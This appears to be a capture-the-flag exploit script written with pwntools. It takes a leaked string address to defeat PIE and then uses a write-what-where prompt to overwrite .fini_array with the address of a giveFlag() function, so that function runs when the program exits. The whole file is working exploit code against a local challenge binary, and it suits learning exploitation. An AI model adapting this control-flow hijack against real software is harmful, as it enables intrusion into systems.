# write the location of the giveFlag() function to .fini_array so 
# it executes right before the program exits
from pwn import *

#p = process("./program")
p = remote("127.0.0.1",17424)
binary = ELF('./program')

static_give_flag = binary.symbols['giveFlag']

static_blue_loc       = 0x205a
static_fini_array_loc = 0x3230

p.recvuntil('==\n\n')
# get 'Blue' string location
blue_loc = int(p.recvline().decode().split('(0x')[1].split(')')[0],16)

# get PIE address for .fini_array
fini_blue_diff = static_fini_array_loc - static_blue_loc
real_fini_array_loc = blue_loc + fini_blue_diff

# get PIE address for giveFlag()
give_flag_blue_diff = static_blue_loc - static_give_flag
real_give_flag = blue_loc - give_flag_blue_diff

p.recvuntil('Where?: ')
p.sendline(hex(real_fini_array_loc))
p.recvuntil('What?: ')
p.sendline(hex(real_give_flag))
p.interactive()